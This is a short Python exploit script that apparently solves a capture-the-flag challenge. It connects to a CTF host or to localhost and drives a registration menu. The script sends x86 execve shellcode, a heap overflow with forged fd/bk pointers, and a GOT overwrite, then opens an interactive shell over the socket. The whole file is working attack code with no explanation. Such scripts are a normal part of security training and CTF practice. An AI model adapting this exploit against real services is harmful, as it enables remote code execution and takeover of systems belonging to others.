import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def register(name, email, tel):
    read_until(f, ">>")
    f.write("1\n")
    read_until(f, "(name)")
    f.write(name+"\n")
    read_until(f, "(email)")
    f.write(email+"\n")
    read_until(f, "(tel)")
    f.write(tel+"\n")

def main():
    sc = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

    buf = "A"*16
    buf += p(0xd5)
    buf += p(0x0804B000) # fd
    buf += p(0x0804c034) # bk

    register(sc, "a"*4, buf)
    read_until(f, ">>")
    f.write("1\n")
    read_until(f, "(name)")
    f.write("B"*24+p(0x804c044)+"\n") # GOT overwrite

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("ab1.ctfq.maguro.run", 10002)
        main()
    else:
        s, f = sock("localhost", 10002)
        main()
